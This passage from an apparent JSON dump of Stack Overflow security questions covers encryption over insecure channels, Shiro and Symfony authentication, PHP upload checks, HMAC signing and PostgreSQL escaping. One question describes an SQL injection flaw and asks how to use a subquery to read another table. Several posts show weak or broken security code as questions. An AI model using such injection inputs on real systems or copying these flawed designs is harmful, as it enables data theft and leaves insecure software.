rel=\"nofollow\">twitter API</a> to <a href=\"http://www.simsbox.net/blog/7/integrating-twitter-with-blog-comments/\" rel=\"nofollow\">integrate twitter</a> with my blog's commenting system.  The problem with the twitter API and many other web APIs out there is that they require the user's username and password to do anything useful.  I don't want to deal with the hassle and cost of installing a SSL certificate, but I also don't want passwords passed over the wire in clear text.</p>\n\n<p>I guess my general question is: <strong>How can I send sensitive data over an insecure channel?</strong></p>\n\n<p>This is my current solution and I'd like to know if there are any holes in it:</p>\n\n<ol>\n<li>Generate a random key on the server (I'm using php).</li>\n<li>Save the key in a session and also output the key in a javascript variable.</li>\n<li>On form submit, use <a href=\"http://tero.co.uk/des/\" rel=\"nofollow\">Triple DES in javascript</a> with the key to encrypt the password.</li>\n<li>On the server, decrypt the password using the key from the session and then destroy the session.</li>\n</ol>\n\n<p>The end result is that only the encrypted password is sent over the wire and the key is only used once and never sent with the password.  Problem solved?</p>\n"},{"tags":["security","https"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":34,"score":2,"question_id":13242942,"title":"Is passing username/password in http string safe for this API?","body":"<p>Reading over \n<a href=\"http://getpocket.com/api/docs/\" rel=\"nofollow\">http://getpocket.com/api/docs/</a></p>\n\n<p>Is it safe to pass a password through the HTTP string? My understand is that this is not safe, even though it's HTTPS. Correct?</p>\n"},{"tags":["java","security","authentication","guice","shiro"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":97,"score":3,"question_id":12894227,"title":"Authentication against database using shiro 1.2.1","body":"<p>I am using Apache Shiro in my project. Currently I am using 1.1.0 version and now I am trying to migrate Shiro components to latest version 1.2.1. But when I try to do user authentication against a db it not working for some reason and I am not getting any errors but authentication is not happening.</p>\n\n<p>Following are the database details I had given in shiro.ini file.</p>\n\n<pre><code>[main]\ncacheManager = com.cacheManager.ShiroCacheManager\nsecurityManager.cacheManager = $cacheManager\n\njdbcRealm=org.apache.shiro.realm.jdbc.JdbcRealm\n\njdbcRealm.authenticationQuery = select user_pass from users where user_name = ?\njdbcRealm.userRolesQuery = select role_name from user_roles where user_name = ?\n\nds = com.mysql.jdbc.jdbc2.optional.MysqlDataSource\nds.serverName = 192.168.0.75\nds.port  = 3306\nds.user = test\nds.databaseName = appfuse\njdbcRealm.dataSource = $ds\n</code></pre>\n\n<p>But still it is not hitting the database. I am using tomcat server and trying to use guice and shiro integration example...</p>\n\n<p>Any help in this regard is really appreciated and thanks in advance for your help!</p>\n\n<p>Thanks &amp; Regards, \n<br />Gupta Katakam</p>\n"},{"tags":["c#",".net","security","aes","rijndael"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":13079150,"title":"Encrypt and Decrypt with Rijndael data too long","body":"<p>I'm trying to get this code to encrypt and decrypt but I keep getting data length too long when decrypting during the <code>.FlushFinalBlock()</code>.</p>\n\n<p>I'm not sure what I'm doing wrong here because I'm out of my element on this issue.</p>\n\n<p>Can anyone tell me what I'm doing wrong here? Encryption is OK, but it cannot decrypt its encryption.</p>\n\n<pre><code>   static byte[] u8_Salt = new byte[] { 0x26, 0x19, 0x81, 0x4E, 0xA0, 0x6D, 0x95, 0x34, 0x26, 0x75, 0x64, 0x05, 0xF6 };\n\n   public static string Encrypt(string data, string password)\n    {\n        //\n        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, u8_Salt);\n        //\n        Rijndael i_Alg = Rijndael.Create();\n        i_Alg.Padding = PaddingMode.None;\n        i_Alg.Key = pdb.GetBytes(32);\n        i_Alg.IV = pdb.GetBytes(16);\n        //\n        using (var cryptoProvider = new DESCryptoServiceProvider())\n        using (var memoryStream = new MemoryStream())\n        using (var cryptoStream = new CryptoStream(memoryStream, cryptoProvider.CreateEncryptor(), CryptoStreamMode.Write))\n        using (var writer = new StreamWriter(cryptoStream))\n        {\n            writer.Write(data);\n            writer.Flush();\n            cryptoStream.FlushFinalBlock();\n            writer.Flush();\n            return Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length);\n        }\n    }\n    public static string Decrypt(string data, string password)\n    {\n        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, u8_Salt);\n        //\n        Rijndael i_Alg = Rijndael.Create();\n        i_Alg.Padding = PaddingMode.None;\n        i_Alg.Key = pdb.GetBytes(32);\n        i_Alg.IV = pdb.GetBytes(16);\n        //\n        using (var cryptoProvider = new DESCryptoServiceProvider())\n        using (var memoryStream = new MemoryStream())\n        using (var cryptoStream = new CryptoStream(memoryStream, cryptoProvider.CreateDecryptor(), CryptoStreamMode.Write))\n        using (var writer = new StreamWriter(cryptoStream))\n        {\n            writer.Write(data);\n            writer.Flush();\n            cryptoStream.FlushFinalBlock();\n            writer.Flush();\n            return Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length);\n        }\n    }\n</code></pre>\n"},{"tags":["c#","wpf","security","principal"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13233683,"title":"Setting CurrentPrincipal for a WPF application from within a test","body":"<p>we have a WPF application that uses CurrentPrincipal to handle security. This all works fine.</p>\n\n<p>Now, from within a test project, we call view model operations. The problem is, that in the initialization of the test we create a new instance of the application but we don't know how to set the CurrentPrincipal on this application:</p>\n\n<pre><code> private void TestInitialize()\n {\n      var app = new App();\n      // setting Thread.CurrentPrincipal doesn't set app thread it seems\n }\n</code></pre>\n\n<p>Anyone has an idea how to set the CurrentPrincipal for a WPF application from outside the application?</p>\n"},{"tags":["security","identity","google-cloud-messaging"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13235810,"title":"Google Cloud Messaging and Identity","body":"<p>I've read through all the offical documentation, but I couldt not find the answer for the following questions:</p>\n\n<ul>\n<li><p>What key does the Android send to the Google server so it can identify the device (+user?). The question is more like: If I have 2 devices with the same account and install the app on both (both will have different Registration IDs). Is it the serial number of the device? Or it combines something with the Google ID stored on the device? </p></li>\n<li><p>How does GCM application does not require Google Account if it requires Google Play instaled and authenticated with at least one Google User?</p></li>\n<li><p>If my application supports multiple users (multiple Google accounts on the same device), the application itself cannot register twice and differentiate the messages received by GCM, right?</p></li>\n<li><p>If I have Google Play with 2 accounts, does it affect GCM at all? Or having at least one or 10 does not matter?</p></li>\n</ul>\n\n<p>The questions above are part of a security analysis. Any help or official documentation is pretty much appreciated.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","image","security","file-upload","gd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":46,"score":0,"question_id":13236782,"title":"Secure image upload PHP","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/11061355/security-threats-with-uploads\">Security threats with uploads</a>  </p>\n</blockquote>\n\n\n\n<p>I've been searching for a good script/tutorial for secure image upload, but whatever I find, reading the comments there seem to be issues with the script as far as security is concerned. So I tried to compose my on script. I would like to ask for any security suggestions on this.</p>\n\n<pre><code>//create arrays from allowed extensions and types\n$allowed_exts = array(\"jpg\", \"jpeg\", \"png\", \"gif\");\n$allowed_types = array(\"image/jpeg\", \"image/png\", \"image/gif\");\n\n//extract extension from uploaded file\n$ext = strtolower(substr($_FILES[\"image\"][\"name\"], strrpos($_FILES[\"image\"][\"name\"], \".\") + 1));\n</code></pre>\n\n<p>I first check if the extension is one of the allowed</p>\n\n<pre><code> if(in_array($ext, $allowed_exts) === false){\n    echo \"Only .jpg, .png, .gif allowed\";\n    }\n</code></pre>\n\n<p>Then check if the type is one of the allowed</p>\n\n<pre><code> elseif(in_array($_FILES[\"image\"][\"type\"], $allowed_types) === false){\n    echo \"Only .jpg, .png, .gif allowed\";\n    }\n</code></pre>\n\n<p>Then check the filesize</p>\n\n<pre><code>elseif($_FILES[\"image\"][\"size\"] &gt; 2100000){\n    echo \"File is too big\";\n}\n</code></pre>\n\n<p>Now use getimagesize to check for dimensions</p>\n\n<pre><code>   elseif(!getimagesize($_FILES[\"image\"][\"tmp_name\"])){ \n    echo \"File is not an image\";\n    } else {\n</code></pre>\n\n<p>I create a random file name</p>\n\n<pre><code>$filename = mt_rand(1000,99999).\"_\".$_POST['p_id'].\".jpg\";\n</code></pre>\n\n<p>If this is all fine, I create a thumb using GD. In short (incase its a jpeg):</p>\n\n<pre><code>a. imagecreatefromjpeg -&gt; from uploaded file\nb. imagecreatetruecolor -&gt; with desired thumbnail dimensions\nc. imagecopyresampled -&gt; modify the image created under a.\nd. imagejpeg -&gt; save image to destination\n</code></pre>\n\n<p>So, as I've read this should eliminate most problems that come with the image, but I m sure I missed something important.</p>\n\n<p>The directory I write the files to has 755 permission, but I think I have to make more restrictions on the directory by putting a .htaccess in the folder? What should be in there?</p>\n"},{"tags":["java","security","authentication","iframe","salesforce"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13226288,"title":"iFrame Authentication","body":"<p>I am in the midway of integrating <strong>salesforce.com with a legacy system via iFrame</strong> link consisting of <strong>orgId</strong> as request parameter and legacy system(Java Application) upon getting orgId as request parameter check db of legacy system whether this orgId already exist or not (prior existence means Salesforce user has grant access to the legacy System Application), so question which remains unanswered is <strong>if somehow orgId gets captured by intruder then they can access legacy system application</strong> easily, so challenge is to stop any such attacks.\nFYI both iFrame link and salesforce site runs on https protocol.</p>\n"},{"tags":["mysql","sql","query","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13238850,"title":"Override column value in WHERE clause?","body":"<p>I was wondering if it was possible to override column value in the Where clause of a SQL query (MySQL in my case).</p>\n\n<p>To be more clear, here is an example :</p>\n\n<p>Suppose a basic query is :</p>\n\n<pre><code>SELECT lastname, firstname FROM contacts WHERE lastname = \"Doe\";\n</code></pre>\n\n<p>Is it possible to force <code>lastname</code> and <code>firstname</code> to return value from an other table, just by modifying what is after the WHERE part ? Something like </p>\n\n<pre><code>SELECT lastname, firstname FROM contacts WHERE lastname = (SELECT name FROM companies);\n</code></pre>\n\n<p>I am currently testing a web application, and I found a SQL Injection flaw where I can change <code>Doe</code> to whatever I want, but I'm limited with only one query (<a href=\"http://php.net/mysql_query\" rel=\"nofollow\">mysql_query restriction of PHP</a>) and <code>addslashes</code> (so no \" and ').</p>\n"},{"tags":["php","security","filter-input"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2304,"score":3,"question_id":298535,"title":"PHP's new input_filter does not read $_GET or $_POST arrays","body":"<p>In PHP 5.2 there was a nice security function added called \"input_filter\", so instead of saying:</p>\n\n<pre><code>$name = $_GET['name'];\n</code></pre>\n\n<p>you can now say:</p>\n\n<pre><code>$name = filter_input (INPUT_GET, 'name', FILTER_SANITIZE_STRING);\n</code></pre>\n\n<p>and it automatically sanitizes your string, there is also:</p>\n\n<ul>\n<li><code>FILTER_SANITIZE_ENCODED</code></li>\n<li><code>FILTER_SANITIZE_NUMBER_INT</code></li>\n<li><code>FILTER_SANITIZE_EMAIL</code></li>\n<li><code>FILTER_SANITIZE_URL</code></li>\n</ul>\n\n<p>etc. \nso this is a very convenient security feature to use and I want to switch over to it completely.</p>\n\n<p><b>The problem is...</b> I often manipulate the $_GET and $_POST arrays before processing them, like this:</p>\n\n<p>$_GET['name'] = '(default name)';</p>\n\n<p>but it seems that filter_input does not have access to the changes in $_GET since it reads \"INPUT_GET\" which is of type int (?). It would be nice if I could get filter_input to read $_GET instead but:</p>\n\n<pre><code>$name = filter_input ( $_GET, 'name', FILTER_SANITIZE_STRING );\n</code></pre>\n\n<p>gives me the error:</p>\n\n<pre><code>Warning: filter_input() expects parameter 1 to be long, array given.\n</code></pre>\n\n<p>Can anyone think of a way that I could:</p>\n\n<ul>\n<li>manipulate the source of <code>INPUT_GET</code> (whereever it is) so that I can change its values before filter_input can read them</li>\n<li>get filter_input to read <code>$_GET</code></li>\n</ul>\n\n<p><code>ADDENDUM:</code>\n<hr/></p>\n\n<p>Rich asked: \"Why are you changing the arrays anyway, surely you want them to be an input, rather than something you've programmatically inserted.\"</p>\n\n<p>It is just a very convenient place to preprocess variables coming in, e.g. in order to:</p>\n\n<ul>\n<li>set defaults (if $_GET['state'] = '' then $_GET['state'] = 'AL')</li>\n<li>do manual processing (delete all spaces, etc.)</li>\n<li>security (some of which will be done by filter_input now)</li>\n</ul>\n\n<p>Then I know by the time I get the incoming variable, it is secure and valid. Of course I could copy the $_GET array to another array and process THAT array but that is just an unnecessary step since I $_GET is already a functioning array so it makes sense to do it with these system arrays that already exist.</p>\n"},{"tags":["algorithm","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":395,"score":-1,"question_id":10987302,"title":"Scratch card number & serial generator","body":"<p>In a company, We need to make scratch cards similar to the ones available in the market.</p>\n\n<ul>\n<li>there is number hidden which needs to be scratched.</li>\n<li>Serial number which is visible.</li>\n</ul>\n\n<p>My question is very basic that how do other companies make those hidden and serial numbers. I have read little bit about hashing but couldn't connect the dots. </p>\n\n<ol>\n<li>Is the serial number independent of the invisible part?</li>\n<li>Do they take a serial number and hash that to make the invisible part or vice versa?</li>\n</ol>\n\n<p>and also,</p>\n\n<ol>\n<li>How are invisible numbers made? like what algorithm is commonly used for that?</li>\n</ol>\n\n<p>Any insight will be helpful. Thank you.</p>\n"},{"tags":["security","symfony2","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13238072,"title":"There is no user provider for user \"Myapp\\MainBundle\\Document\\User\\User\"","body":"<p>I'm trying to authenticate with a custom user provider, and the default login form.</p>\n\n<p>The login part seems to work, because if I put an incorrect password it says 'bad credentials'. And if I put the correct password and catch the redirect, I can see my username in the toolbar.</p>\n\n<p>But after the redirect, I get <code>There is no user provider for user \"Myapp\\MainBundle\\Document\\User\\User\"</code></p>\n\n<p>My user provider is configured like this:</p>\n\n<pre><code># security.yml\nproviders:\n    database:\n        id: user_manager\nfirewalls:\n    dev:\n        pattern:  ^/(_(profiler|wdt)|css|images|js)/\n        security: false\n    main:\n        pattern: ^/\n        form_login:\n            login_path: /login\n            check_path: /login_check\n        logout:\n            path:   /logout\n            target: /\n        anonymous: true\n\n# config.yml\nservices:\n    user_manager:\n        class: Myapp\\MainBundle\\Service\\User\\UserManager\n        factory_service: doctrine_mongodb\n        factory_method:  getRepository\n        arguments: [ 'MyappMainBundle:User\\User' ]\n        calls:\n            - [ setEncoder, [ @security.encoder_factory ] ]\n</code></pre>\n\n<p>This is the user provider (the abstract class extends from DocumentRepository, and implements UserProviderInterface):</p>\n\n<pre><code>namespace Myapp\\MainBundle\\Service\\User;\n\nuse Myvendor\\UserBundle\\Service\\User\\AbstractUserManager;\nuse Myapp\\MainBundle\\Document\\User\\User;\n\nclass UserManager extends AbstractUserManager {\n    public function createUser() {\n        return new User;\n    }\n\n    public function supportsClass($class) {\n        return $class === 'Myapp\\MainBundle\\Document\\User\\User';\n    }\n}\n</code></pre>\n\n<p>How can this happen? Why does it find the provider for the login, but then fail on the next request?</p>\n\n<p>Symfony version: 2.1.3</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I debugged the code that comes right before that exception and found this was being catched (for the only provider I have): <code>\"Symfony\\Component\\Security\\Core\\Exception\\UnsupportedUserException\" \"Instances of \"Myapp\\MainBundle\\Document\\User\\User\" are not supported.</code>. How can this be possible? I even tried returning <code>true</code> in <code>supportsClass()</code></p>\n"},{"tags":["c#","winforms","security"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13236940,"title":"Which passwordchar shows a black dot () in a winforms textbox using code?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4051302/which-passwordchar-shows-a-black-dot-in-a-winforms-textbox\">Which passwordchar shows a black dot () in a winforms textbox?</a><br>\n  <a href=\"http://stackoverflow.com/questions/6796157/unicode-encoding-for-string-literals-in-c11\">Unicode encoding for string literals in C++11</a>  </p>\n</blockquote>\n\n\n\n<p>I want to use code to reveal the password or make it a dot like </p>\n\n<pre><code>textBoxNewPassword.PasswordChar = (char)0149;\n</code></pre>\n\n<p>How can I achieve this?</p>\n"},{"tags":["flash","security","flash-cs3"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":12535,"score":6,"question_id":2653669,"title":"Flash Security.AllowDomain()","body":"<p>I've got a Flash movie, loading data from an external URL. In fact, it's a RSS reader inside a banner.</p>\n\n<p>Everything works perfectly when the Flash movie and data URL are on the same domain. However, if the Flash movie is on another domain, Flash security kicks in.</p>\n\n<p>The manual says that I can allow a domain trough Security.AllowDomain()</p>\n\n<pre><code>system.Security.allowDomain(\"http://www.mydomain.abc/\")\nxmlData = new XML();\nxmlData.ignoreWhite = true;\nxmlData.onLoad = loadXML;\nxmlData.load(\"http://www.mydomain.abc/content.php\");\n</code></pre>\n\n<p>But when I embed the .swf in a HTML page, the data won't load. Any tips how to debug or solve this?</p>\n"},{"tags":["python","ruby","perl","security","penetration-testing"],"answer_count":13,"favorite_count":10,"up_vote_count":9,"down_vote_count":4,"view_count":2390,"score":5,"question_id":76408,"title":"Which of these scripting languages is more appropriate for pen-testing?","body":"<p>First of all, I want to avoid a flame-war on languages. The languages to choose from are Perl, Python and Ruby . I want to mention that I'm comfortable with all of them, but the problem is that I can't focus just on one. </p>\n\n<p>If, for example, I see a cool Perl module, I have to try it out. If I see a nice Python app, I have to know how it's made. If I see a Ruby DSL or some Ruby voodoo, I'm hooked on Ruby for a while.</p>\n\n<p>Right now I'm working as a Java developer, but plan on taking CEH in the near future. My question is: for tool writing and exploit development, which language do you find to be the most appropriate?</p>\n\n<p>Again, I don't want to cause a flame-war or any trouble, I just want honest opinions from scripters that know what they're doing.</p>\n\n<p>One more thing: maybe some of you will ask \"Why settle on one language?\". To answer this: I would like to choose only one language, in order to try to master it.</p>\n"},{"tags":["asp.net","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":13234304,"title":"Secure a single page in an ASP.NET app","body":"<p>I often have a need to secure a single page (i.e. Reports) on a public facing app so that only authorized users may access the page. In the past, this mean setting up a custom login form or using the ASP.NET membership provider or something else far too complex to serve the purpose. Is there an easier (safe) way to secure a single page in this fashion?</p>\n\n<p>Some things I've considered:</p>\n\n<ul>\n<li>Client certificates (initial setup is a pain)</li>\n<li>A single master password (works in a pinch, but feels dirty)</li>\n<li>Restrict access by host address (cumbersome when the need arises to allow external users access to the page). Also, need to support access via proxy (X-Forwarded-For) which can be faked by technical users)</li>\n</ul>\n\n<p>Are there other options? Recommendations?</p>\n"},{"tags":["java","security","web-applications","esapi"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3095,"score":1,"question_id":7696423,"title":"Trying to Use ESAPI But getting Error","body":"<p>I am trying to use ESAPI.jar for providing security to my web application.Basically I have just started using ESAPI.jar.\nBut problem is I am not able to run even a simple program using ESAPI.\nThe small code snippet is:-</p>\n\n<pre><code> String clean = ESAPI.encoder().canonicalize(\"someString\");\n    Randomizer r=ESAPI.randomizer();    \n    System.out.println(r);\n    System.out.println(clean);\n</code></pre>\n\n<p>I get this error:-</p>\n\n<pre><code>Attempting to load ESAPI.properties via file I/O.\nAttempting to load ESAPI.properties as resource file via file I/O.\nNot found in 'org.owasp.esapi.resources' directory or file not readable: D:\\Eclipse-Workspace\\Test\\ESAPI.properties\nNot found in SystemResource Directory/resourceDirectory: .esapi\\ESAPI.properties\nNot found in 'user.home' (C:\\Documents and Settings\\user.user) directory: C:\\Documents and Settings\\user.user\\esapi\\ESAPI.properties\nLoading ESAPI.properties via file I/O failed. Exception was: java.io.FileNotFoundException\nAttempting to load ESAPI.properties via the classpath.\nESAPI.properties could not be loaded by any means. Fail. Exception was: java.lang.IllegalArgumentException: Failed to load ESAPI.properties as a classloader resource.\nException in thread \"main\" org.owasp.esapi.errors.ConfigurationException: java.lang.reflect.InvocationTargetException SecurityConfiguration class (org.owasp.esapi.reference.DefaultSecurityConfiguration) CTOR threw exception.\n    at org.owasp.esapi.util.ObjFactory.make(ObjFactory.java:129)\n    at org.owasp.esapi.ESAPI.securityConfiguration(ESAPI.java:184)\n    at org.owasp.esapi.ESAPI.encoder(ESAPI.java:99)\n    at org.rancore.testJasp.TestEsapi.main(TestEsapi.java:59)\nCaused by: java.lang.reflect.InvocationTargetException\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\n    at java.lang.reflect.Method.invoke(Unknown Source)\n    at org.owasp.esapi.util.ObjFactory.make(ObjFactory.java:86)\n    ... 3 more\nCaused by: org.owasp.esapi.errors.ConfigurationException: ESAPI.properties could not be loaded by any means. Fail.\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.loadConfiguration(DefaultSecurityConfiguration.java:439)\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.&lt;init&gt;(DefaultSecurityConfiguration.java:227)\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.getInstance(DefaultSecurityConfiguration.java:75)\n    ... 8 more\nCaused by: java.lang.IllegalArgumentException: Failed to load ESAPI.properties as a classloader resource.\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.loadConfigurationFromClasspath(DefaultSecurityConfiguration.java:667)\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.loadConfiguration(DefaultSecurityConfiguration.java:436)\n    ... 10 more\n</code></pre>\n\n<p>I have tried copying the 3 properties file of ESAPI  in source folder and also configuring them on build path but still I have not succeeded.I have tried many permutations and combinations but to no avail.</p>\n\n<p>Please guide me..</p>\n\n<p>The content of property file is </p>\n\n<pre><code># User Messages\nError.creating.randomizer=Error creating randomizer\n\nThis.is.test.message=This {0} is {1} a test {2} message\n\n# Validation Messages\n\n# Log Messages\n</code></pre>\n"},{"tags":["security","passwords"],"answer_count":6,"favorite_count":20,"up_vote_count":22,"down_vote_count":0,"view_count":5883,"score":22,"question_id":270485,"title":"Password Management Best Practices (soup to nuts, not just storage or generation)","body":"<p>We have a site with personal user information. I need to know best-practices for password management.</p>\n\n<ol>\n<li>These are average users - should I impose 'hard' passwords?</li>\n<li>Is there any disadvantage to using the user's email address as a userid?</li>\n<li>How should I handle forgotten password requests? Obviously, I can't email them to the user.</li>\n<li>How should the passwords be stored, encrypted? Should I encrypt the userids as well?</li>\n</ol>\n"},{"tags":["security","rsa","pgp","shared-secret"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12959134,"title":"Security protocol for server-side shared secret generation","body":"<p>I am trying to implement a security system that has the following requirements:</p>\n\n<ul>\n<li>All clients share a password, which is <strong>not</strong> known to the server</li>\n<li>Each client has a <strong>unique</strong> client-id, which <strong>is</strong> known to the server</li>\n<li>All clients with knowledge of the password must be able to generate the same shared secret on the server (this secret can be anything, it just needs to be the same for all clients and unique across passwords)</li>\n<li>The password needs to remain secure, even if the server or the transport get hacked</li>\n<li>It must be impossible for another party with a different client-id to generate the same server-side secret without knowledge of the password</li>\n</ul>\n\n<p>Let me try to give a graphical representation of this:</p>\n\n<pre><code>            Client                         Server\n.--------------^-----------.       .----------^----------.\n\n          f(client-id 1)              g(client-id 1)\nPASSWORD ----------------&gt; request 1 ----------------&gt; KEY\n   || equal                                             || equal\nPASSWORD ----------------&gt; request 2 ----------------&gt; KEY\n          f(client-id 2)              g(client-id 2)\n</code></pre>\n\n<p>Here, f() [g()] are functions that the client [server] applies to the password [request] to obtain the request [key]. These functions may depend on the client-id.</p>\n\n<p>There's two approaches that I have come up with that might do this, but I am hoping for something simpler that requires less traffic and less server load:</p>\n\n<ol>\n<li><p>\"No-brainer\": The clients hash the password. The clients and server each use a standard mechanism (like SSL) to secure their connection and send the hash over this connection.</p></li>\n<li><p>\"A little more clever\": The server has a fixed private-key coded into it and each client has the public-key coded into it. The clients hash the password, XOR it with their client-id, encrypt the result with RSA/PGP using the public key. The server then decrypts the request using the private key and XORs the result with the client-id to arrive at the password hash.</p></li>\n</ol>\n\n<p>In both cases, the server ends up with the same secret for the clients: the password hash. The advantage of the second version is that there is no need for the overhead of a full-fledged key exchange and encryption system, since unfortunately I won't be able to rely on SSL in all cases. In fact, it allows me to generate the server secret in a single request without any handshake. The client-id-XOR in the second version are used to prevent replay-attacks, where a third party with a different client-id could otherwise simply send the same encrypted message to the server to generate the same secret. Basically it's a no-overhead way to add a salt.</p>\n\n<p>Now the question:</p>\n\n<p>Since I don't really have any requirements on the server-side secret, not even that the clients can generate this secret locally, <strong>is there an even simpler way to do this</strong> that doesn't require expensive modular exponentiation of arbitrary-precision numbers like RSA does? I'm thinking of maybe some sort of other trapdoor function for f() and g() above that allows me to achieve the same result.</p>\n"},{"tags":["php","security","api","rest","hmac"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":65,"score":0,"question_id":13235898,"title":"How do I restrict access to an API signature generator in PHP?","body":"<p>When using an HMAC signature for authenticating REST API calls, how can I prevent someone from  creating their own useable signature by manually calling the script that generates the signature?</p>\n\n<p>For example, if an AJAX request is used to retrieve a signature that will be appended to a CORS Ajax request to the API, the possibility exists that someone can create their own signature by passing the appropriate values/headers.</p>\n\n<p>I know that I could use <code>$_SERVER['REMOTE_ADDR']</code> or <code>$_SERVER['REMOTE_HOST']</code> to add some layer of security, but these can be spoofed.</p>\n\n<p>Please assume that I'll be using SSL for all connections, and that I know about OAuth but will not be using it here.</p>\n"},{"tags":["php","security","postgresql"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":49,"score":3,"question_id":13235664,"title":"Is this PostgreSQL query vulnerable?","body":"<p>Using the <a href=\"http://www.php.net/manual/en/function.pg-escape-literal.php\" rel=\"nofollow\">pg_escape_literal</a> PHP function, I'm escaping my user input data as follows:</p>\n\n<pre><code>  &lt;?php\n  $dbconn = pg_connect('dbname=foo');\n  $escaped = pg_escape_literal($_GET['name']);\n  pg_query(\"INSERT INTO participants (name) VALUES ({$escaped})\");\n  ?&gt;\n</code></pre>\n\n<p>Being new to PostgreSQL, my questions are:</p>\n\n<ul>\n<li>Is there a way to achieve an SQL injection given this code?</li>\n<li>Is there any other vulnerability that is left untreated in this code?</li>\n</ul>\n\n<p>Using PHP 5.4 and PostgreSQL 9.2. </p>\n"},{"tags":["django","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":7714979,"title":"How to avoid sensitive information in POSTs from appearing in logs and debug emails?","body":"<p>One of my websites has a form for customers to submit their credit card information.</p>\n\n<p>Under normal operation the sensitive information (credit card number, expiration date, etc) is fairly secured due to the SSL of the connection and the fact that the data may not be saved on the backend after the charging attempt.</p>\n\n<p>The problem starts whenever an exception is raised by the backend code handling the request, since the exception details (which with Django include the POST QueryDict) contain the sensitive info in plain text. These in turn find their way into both the error logs and into emails which are sent to the admins.</p>\n\n<p>Is there some elegant way to avoid this?</p>\n"},{"tags":["security","authentication","grails","nimble"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":305,"score":1,"question_id":5762908,"title":"Grails request filters: what's the source of this mysterious authorization method?","body":"<p>I'm building a custom authentication filter class in Grails.  It's working, but it bugs me that I don't know <em>why</em> it's working.</p>\n\n<p>In the following Grails request filter, where/how is the \"role\" method defined?  It's got to be part of the Nimble plugin for Grails, but I don't see it in NimbleFilterBase, which my filter class extends.  </p>\n\n<pre><code>public class MySecurityFilters extends MyCustomExtensionOfNimbleFilterBase {\n    def filters = {\n        reports(controller: 'foo', action: 'bar') {\n            before = {\n                accessControl {\n                    role('Administrator')\n                }\n            }\n        }\n</code></pre>\n\n<p>Also, what exactly is the \"accessControl\" block?  Is that a built-in part of Grails, or something Nimble somehow provides, or just a random scoping mechanism that I could get rid of? </p>\n\n<p>Thanks!</p>\n"},{"tags":["php","security","symfony2","response"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12749457,"title":"Voter causing 500 error rather than 403","body":"<p>I've created a custom voter that denies access to my API if the request doesn't contain a valid auth header. It's based on a combination of two cookbook entries: \n<a href=\"http://symfony.com/doc/current/cookbook/security/voters.html\" rel=\"nofollow\">http://symfony.com/doc/current/cookbook/security/voters.html</a> and <a href=\"http://symfony.com/doc/current/cookbook/security/custom_authentication_provider.html\" rel=\"nofollow\">http://symfony.com/doc/current/cookbook/security/custom_authentication_provider.html</a></p>\n\n<pre class=\"lang-php prettyprint-override\"><code>&lt;?php\n\nnamespace Acme\\RestBundle\\Security\\Authorization\\Voter;\n\nuse Symfony\\Component\\DependencyInjection\\ContainerInterface;\nuse Symfony\\Component\\Security\\Core\\Authorization\\Voter\\VoterInterface;\nuse Symfony\\Component\\Security\\Core\\Authentication\\Token\\TokenInterface;\nuse Symfony\\Component\\Security\\Core\\Exception\\AuthenticationException;\nuse Symfony\\Component\\Security\\Core\\Exception\\NonceExpiredException;\nuse Monolog\\Logger;\n\nclass ApiClientVoter implements VoterInterface\n{\n    protected $container;\n    protected $nonceCacheDir;\n\n    /**\n     * We inject the full service container due to scope issues when\n     * injecting the request.\n     *\n     * @param ContainerInterface $container\n     * @param string $nonceCacheDir\n     */\n    public function __construct(ContainerInterface $container, $nonceCacheDir)\n    {\n        $this-&gt;container     = $container;\n        $this-&gt;nonceCacheDir = $nonceCacheDir;\n 